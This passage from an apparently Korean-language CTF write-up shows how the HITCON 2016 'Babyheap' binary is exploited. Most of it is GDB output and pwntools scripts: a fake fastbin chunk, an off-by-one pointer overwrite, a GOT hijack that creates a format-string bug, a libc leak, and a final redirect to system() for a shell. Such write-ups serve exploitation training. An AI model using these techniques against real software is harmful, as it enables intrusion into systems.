  + 입력 값으로 전달된 fake allocated chunk는 다음과 같은 영역에 저장됩니다.
    - Fake allocated chunk가 저장된 영역 : 0x20e7ff0
  + 즉, 0x20e8000 영역의 해제를 요청하면 free() 함수는 0x20e7ff8 영역을 allocated chunk의 size 값으로 인식하고 해제 합니다.

```sh title="result"
lazenca0x0@ubuntu:~/CTF/HITCON/Babyheap$ python test.py 
[+] Starting local process './babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b': pid 103665
```

* **다음과 같이 Fake allocated chunk를 확인 할 수 있습니다.**
  + scanf()에 의해 Heap 영역이 할당되었습니다.
    - 할당된 Heap 영역 : 0x20e7000
    - 할당된 Heap 영역 크기 : 4096(0x1000)
  + scanf() 함수에 의해 Heap 영역에 fake chunk가 저장되었습니다.
    - fake chunk 영역 : 0x20e7ff0 ~ 0x20e7ff8

```sh title="GDB attach result"
lazenca0x0@ubuntu:~/CTF/HITCON/Babyheap$ gdb -q -p 103665
Attaching to process 103665
Reading symbols from /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b...(no debugging symbols found)...done.
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.23.so...done.
done.
Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/ld-2.23.so...done.
done.
0x00007ff57cbba55c in __read_chk (fd=0x0, buf=0x7fff44ce4270, nbytes=0x10, buflen=<optimized out>) at read_chk.c:33
33	read_chk.c: No such file or directory.
gdb-peda$ b *0x400D3A
Breakpoint 1 at 0x400d3a
gdb-peda$ c
Continuing.

Breakpoint 1, 0x0000000000400d3a in ?? ()
gdb-peda$ info proc map
process 103665
Mapped addresss spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x402000     0x2000        0x0 /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
            0x601000           0x602000     0x1000     0x1000 /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
            0x602000           0x603000     0x1000     0x2000 /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
      0x7ff57caa3000     0x7ff57cc63000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57cc63000     0x7ff57ce63000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57ce63000     0x7ff57ce67000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57ce67000     0x7ff57ce69000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57ce69000     0x7ff57ce6d000     0x4000        0x0 
      0x7ff57ce6d000     0x7ff57ce93000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ff57d06f000     0x7ff57d072000     0x3000        0x0 
      0x7ff57d090000     0x7ff57d092000     0x2000        0x0 
      0x7ff57d092000     0x7ff57d093000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ff57d093000     0x7ff57d094000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ff57d094000     0x7ff57d095000     0x1000        0x0 
      0x7fff44cc6000     0x7fff44ce7000    0x21000        0x0 [stack]
      0x7fff44dac000     0x7fff44dae000     0x2000        0x0 [vvar]
      0x7fff44dae000     0x7fff44db0000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$ ni

0x0000000000400d3f in ?? ()
gdb-peda$ info proc map
process 103665
Mapped addresss spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x402000     0x2000        0x0 /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
            0x601000           0x602000     0x1000     0x1000 /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
            0x602000           0x603000     0x1000     0x2000 /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
           0x20e7000          0x2109000    0x22000        0x0 [heap]
      0x7ff57caa3000     0x7ff57cc63000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57cc63000     0x7ff57ce63000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57ce63000     0x7ff57ce67000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57ce67000     0x7ff57ce69000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ff57ce69000     0x7ff57ce6d000     0x4000        0x0 
      0x7ff57ce6d000     0x7ff57ce93000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ff57d06f000     0x7ff57d072000     0x3000        0x0 
      0x7ff57d090000     0x7ff57d092000     0x2000        0x0 
      0x7ff57d092000     0x7ff57d093000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ff57d093000     0x7ff57d094000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ff57d094000     0x7ff57d095000     0x1000        0x0 
      0x7fff44cc6000     0x7fff44ce7000    0x21000        0x0 [stack]
      0x7fff44dac000     0x7fff44dae000     0x2000        0x0 [vvar]
      0x7fff44dae000     0x7fff44db0000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$ x/2gx 0x20e7000
0x20e7000:	0x0000000000000000	0x0000000000001011
gdb-peda$ x/10gx 0x20e7000 + 0xfe0
0x20e7fe0:	0x4141414141414141	0x4141414141414141
0x20e7ff0:	0x0000000000000000	0x0000000000000071
0x20e8000:	0x000000000000000a	0x0000000000000000
0x20e8010:	0x0000000000000000	0x0000000000020ff1
0x20e8020:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* **다음과 같이 "content->content"의 변화를 확인 할 수 있습니다.**
  + 분석을 위해 다음과 같이 Break point를 설정합니다.

```sh title="Breakpoint setting"
gdb-peda$ b *0x400ADD 
Breakpoint 2 at 0x400add
gdb-peda$ c
Continuing.
```

```sh title="p.interactive()"
[*] Switching to interactive mode
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:$ 1
Size :$ 32
Content:$ BBBB
Name:$ CCCCCCCC
$
```

* **다음과 같이 content->content의 값을 변경됩니다.**  
  + scanf()에서 사용한 Heap 영역 뒤에 "gData"를 위한 Heap 영역이 할당 되었습니다.
  + "gData"의 Heap 영역 뒤에 "content->content"를 위한 Heap 영역이 할당 되었습니다.
* **중요한 것은 "content->content"에 저장된 값 입니다.**
  + "content→content"(0x20e8030)에 저장된 값은 0x20e8040 입니다.
  + 즉, Off-by-One Error에 의해 "0x30"을 "0x00"으로 변경 할 수 있습니다.
    - 0x20e8030 → 0x20e8000

```sh title="p.interactive() - after off-by-one"
Breakpoint 2, 0x0000000000400add in ?? ()
gdb-peda$ x/10gx 0x20e7000 + 0xfe0
0x20e7fe0:	0x4141414141414141	0x4141414141414141
0x20e7ff0:	0x0000000000000000	0x0000000000000071
0x20e8000:	0x000000000000000a	0x0000000000000000
0x20e8010:	0x0000000000000000	0x0000000000000021
0x20e8020:	0x0000000000000020	0x0000000000000000
gdb-peda$ x/20gx 0x20e7000 + 0xfe0
0x20e7fe0:	0x4141414141414141	0x4141414141414141
0x20e7ff0:	0x0000000000000000	0x0000000000000071
0x20e8000:	0x000000000000000a	0x0000000000000000
0x20e8010:	0x0000000000000000	0x0000000000000021
0x20e8020:	0x0000000000000020	0x0000000000000000
0x20e8030:	0x00000000020e8040	0x0000000000000031
0x20e8040:	0x0000000a42424242	0x0000000000000000
0x20e8050:	0x0000000000000000	0x0000000000000000
0x20e8060:	0x0000000000000000	0x0000000000020fa1
0x20e8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ ni
0x0000000000400ae2 in ?? ()
gdb-peda$ x/20gx 0x20e7000 + 0xfe0
0x20e7fe0:	0x4141414141414141	0x4141414141414141
0x20e7ff0:	0x0000000000000000	0x0000000000000071
0x20e8000:	0x000000000000000a	0x0000000000000000
0x20e8010:	0x0000000000000000	0x0000000000000021
0x20e8020:	0x0000000000000020	0x4343434343434343
0x20e8030:	0x00000000020e8000	0x0000000000000031
0x20e8040:	0x0000000a42424242	0x0000000000000000
0x20e8050:	0x0000000000000000	0x0000000000000000
0x20e8060:	0x0000000000000000	0x0000000000020fa1
0x20e8070:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* 다음과 같이 "Delete"기능을 호출합니다.

```sh title="p.interactive() - delete"
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:$ 2
```

* **다음과 같이 Fake chunk가 fastbin에 등록된 것을 확인 할 수 있습니다.**
  + fastbinsY[0] : gData(0x20e8010)
  + fastbinsY[5] : Fake chunk(0x20e7ff0)

```sh title="p.interactive() - fastbin"
^C
Program received signal SIGINT, Interrupt.
0x00007ff57cbba55c in __read_chk (fd=0x0, buf=0x7fff44ce4270, nbytes=0x10, buflen=<optimized out>) at read_chk.c:33
33	in read_chk.c
gdb-peda$ p main_arena.fastbinsY[0]
$2 = (mfastbinptr) 0x20e8010
gdb-peda$ p main_arena.fastbinsY[5]
$3 = (mfastbinptr) 0x20e7ff0
gdb-peda$
```

* **다음과 같은 방법으로 fastbinsY[5]영역을 할당받을 수 있습니다.**
  + "1. New" 기능을 이용해 "Size :"의 값으로 0x60(96)을 입력합니다.
  + malloc() 함수에 의해fastbinsY[5]영역을 재할당합니다.
  + "gData"에는 fastbinsY[0]영역이 재할당됩니다.
* **즉, UAF 취약점을 이용하여 gData 구조체 변수의 내용을 Overflow가 가능합니다.**
  + "ptr→content" 영역에 공격자가 값을 저장하기 원하는 주소 값을 저장 할 수 있습니다.
  + "3. Edit" 기능을 이용해 ptr→content 영역에 저장된 주소에 원하는 값을 저장 할 수 있습니다.

#### **Create FSB vulnerability**

* **해당 문제에서 shell을 획득하기 위해서 libc addresss, 프로그램의 흐름을 변경할 수 있는 주소값이 필요합니다.**
* **이러한 문제를 해결하기 위해 FSB 취약점을 만들어서 해결 할 수 있습니다.**
* **다음과 같은 방법으로 FSB 취약성을 만들 수 있습니다.**
  + atoi() 함수의 GOT 영역에 printf()함수의 plt 주소 값을 저장합니다.
  + printf()함수의 plt 주소 값만 전달 할 경우 \_\_isoc99\_scanf()함수의 GOT 영역에 Lline feed(0x0000000A)값이 저장됩니다.  
    - 이로 인해 Error가 발생합니다.
  + 해당 에러를 해결하기 위해 "printf()의 PLT 주소" 와 "\_\_isoc99\_scanf()의 PLT" 주소를 같이 저장합니다.
* **atoi() 함수를 prinf() 함수로 변경하는 이유는 다음과 같습니다.**
  + 전달되는 인자의 형태
  + printf() 함수의 경우 출력된 문자의 갯수를 반환합니다.
    - 즉, 문자열의 길이를 이용해 기능을 호출 할 수 있습니다.
* 스트립트 코드는 다음과 같습니다.

```python title="babyheap-attack.py"
from pwn import *

context.log_level = 'debug'

binary = ELF('./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b')

got_atoi = binary.got['atoi']
plt_printf = binary.symbols['printf']
plt_scanf = binary.symbols['__isoc99_scanf']

def NewFunction(size,content,name):
	p.recvuntil('Your choice:')
	p.sendline('1')
	p.recvuntil('Size :')
	p.sendline(str(size))
	p.recvuntil('Content:')
	p.sendline(content)
	p.recvuntil('Name:')
	p.sendline(name)

def DeleteFunction():
	p.recvuntil('Your choice:')
	p.sendline('2')

def EditFunction(content):
	p.recvuntil('Your choice:')
	p.sendline('3')
	p.recvuntil('Content:')
	p.sendline(content)

def ExitFunction(answer):
	p.recvuntil('Your choice:')
	p.sendline('4')
	p.recvuntil('Really? (Y/n)')
	p.sendline(answer)

p = process('./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b')

log.info("GOT atoi() : " + hex(got_atoi))
log.info("PLT printf() : " + hex(plt_printf))
log.info("PLT scanf() : " + hex(plt_scanf))

#Save Fake chunk
fakechunk = "n".ljust(0xfe0,"\x41") + p64(0) + p64(0x71)
ExitFunction(fakechunk)

#Off-by-One Error
NewFunction(32,'BBBB','OffbyOne')
DeleteFunction()

#Overflow ptr->content to atio() GOT
overflow = p64(0) * 4
overflow += p64(0x80)
overflow += 'A' * 8
overflow += p64(got_atoi)
NewFunction(96,overflow,"CCCC")

#Overlfow atio() GOT to printf() PLT + scanf() PLT
EditFunction(p64(plt_printf) + p64(plt_scanf))

p.interactive()
```

* **다음은 해당 스크립트를 실행한 결과 입니다.**

```sh title="result"
autolycos@ubuntu:~/CTF/HITCON/Babyheap$ python Exploit.py 
[*] '/home/autolycos/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
    FORTIFY:  Enabled
[+] Starting local process './babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b': Done
[*] GOT atoi() : 0x602078
[*] PLT printf() : 0x400780
[*] PLT scanf() : 0x400800
[*] Switching to interactive mode
Done!
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:$
```

### Leaklibcaddresss

* **다음과 같이 FSB 취약성을 이용해libcaddresss 추출할 수 있습니다.**
  + 첫번째 값(0x7fff5adbd6e0)은 Stack 영역의 주소 입니다.
  + 세번째 값(0x7fef49664cdc)은 Libc영역의 주소입니다.

```sh title="FSB 취약성을 이용해 출력된 Stack에 저장된 값"
[*] Switching to interactive mode
Done!
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:$ %p%p%p%p%p%p%p
0x7fff5adbd6e00x100x7fef49664cdc0x7fef49b227000xc0x400e360x7fef495bd73a
Invalid choice !
```

### Reset the "gEditState" value

* **앞에서 작성한 스트립트를 이용해 FSB 취약성을 생성한 후에 분석을 진행합니다.**
  + 0x400948 영역에 break point를 설정합니다.

```sh title="Breakpoint setting"
gdb-peda$ b *0x400948
Breakpoint 1 at 0x400948
gdb-peda$ c
Continuing.
```

* **다음과 같은 방법으로 "gEditState"의 값을 변경 할 수 있습니다.**
  + UserInput() 함수의 취약성을 이용해 16개의 문자를 Stack에 저장 할 수 있습니다.
  + 즉, FSB 취약성을 이용해 사용자가 입력한 값의 위치를 알면 "gEditState"의 값을 0으로 변경 할 수 있습니다.
* **다음과 같이 "%8$p"를 입력하면 "0xa70243825" 를 출력합니다.**
  + 출력된 "0xa70243825"는 사용자가 입력한 "%8$p" 문자열의 Hex 값입니다.
  + %8 영역은 "nptr" 변수 영역이며, %9 영역은 지역변수의 기본주소가 저장된 영역입니다.
  + 즉,"Your choice:$"의 입력 값으로 "%9$nAAAA" + p64(gEditState의 주소)를 저장하면 FSB 취약성에 의해 "gEditState" 전역 변수의 값이 0으로 변경됩니다.

```sh title="p.interactive() - leak gEditState address"
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:$ %8$p
$ 0xa70243825
```

```sh title="%8p area"
Breakpoint 1, 0x0000000000400948 in ?? ()
gdb-peda$ i r rsi
rsi            0x7ffea3212fa0	0x7ffea3212fa0
gdb-peda$ x/4gx 0x7ffea3212fa0
0x7ffea3212fa0:	0x0000000000000000	0x00007ffea3212fc0
0x7ffea3212fb0:	0x0000000000400820	0x8e40fe9595c66800
gdb-peda$
```

## **Exploit Code**

```python title="Exploit Code"
from pwn import *

context.log_level = 'debug'

binary = ELF('./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

got_atoi = binary.got['atoi']
plt_printf = binary.symbols['printf']
plt_scanf = binary.symbols['__isoc99_scanf']
editCount = 0x6020a4

system = libc.symbols['system']
 
def NewFunction(size,content,name):
	p.recvuntil('Your choice:')
	p.sendline('1')
	p.recvuntil('Size :')
	p.sendline(str(size))
	p.recvuntil('Content:')
	p.sendline(content)
	p.recvuntil('Name:')
	p.sendline(name)

def DeleteFunction():
	p.recvuntil('Your choice:')
	p.sendline('2')

def EditFunction(content):
	p.recvuntil('Your choice:')
	p.sendline('3')
	p.recvuntil('Content:')
	p.sendline(content)

def ExitFunction(answer):
	p.recvuntil('Your choice:')
	p.sendline('4')
	p.recvuntil('Really? (Y/n)')
	p.sendline(answer)

p = process('./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b')

log.info("GOT atoi() : " + hex(got_atoi))
log.info("PLT printf() : " + hex(plt_printf))
log.info("PLT scanf() : " + hex(plt_scanf))

#Save Fake chunk
fakechunk = "n".ljust(0xfe0,"\x41") + p64(0) + p64(0x71)
ExitFunction(fakechunk)

#Off-by-One Error
NewFunction(32,'BBBB','OffbyOne')
DeleteFunction()

#Overflow ptr->content to atio() GOT
overflow = p64(0) * 4
overflow += p64(0x80)
overflow += 'A' * 8
overflow += p64(got_atoi)
NewFunction(96,overflow,"CCCC")

#Overlfow atio() GOT: atoi() PLT -> printf() PLT + scanf() PLT
EditFunction(p64(plt_printf) + p64(plt_scanf))

#Leak Libc addresss
p.recvuntil('Your choice:')
p.sendline('%3$p')
tmp = p.recvuntil('\nInvalid choice')[:14]
leakLibcAddresss = int(tmp,16)
baseLibcAddresss = leakLibcAddresss - 0x116cdc
libcSystem = baseLibcAddresss + system

log.info('Leak Libc Addresss : ' + hex(leakLibcAddresss))
log.info("Base Libc Addresss : " + hex(baseLibcAddresss))
log.info('Libc system() : ' + hex(libcSystem))

#Change the value of "gEditState"
p.recvuntil(':')
p.send("%9$nAAAA"+ p64(editCount))

#Call the Edit function
p.recvuntil(':')
p.sendline('HH')

#atoi() GOT: printf() plt -> system addresss
p.recvuntil(':')
p.sendline(p64(libcSystem))

p.sendline('sh')
p.interactive()
```

:::Note
* atoi() 함수의 GOT 값을 printf()함수의 PLT로 변경했기 때문에 숫자 값을 입력으로 메뉴 기능을 사용할 수 없습니다.
  + 문자의 갯수를 사용해야 합니다.
  + 1번 메뉴 호출은 Enter
  + 2번 메뉴 호출은 문자 1개
  + 3번 메뉴 호출은 문자 2개
  + 4번 메뉴 호출은 문자 3개
:::

## **Flag**

|  |  |
| --- | --- |
| Flag |  |

## **Related Site**

* <http://shift-crops.hatenablog.com/entry/2016/10/11/233559#Babyheap-Pwn-300>
* <https://github.com/scwuaptx/CTF/blob/master/2016-writeup/hitcon/babyheap.py>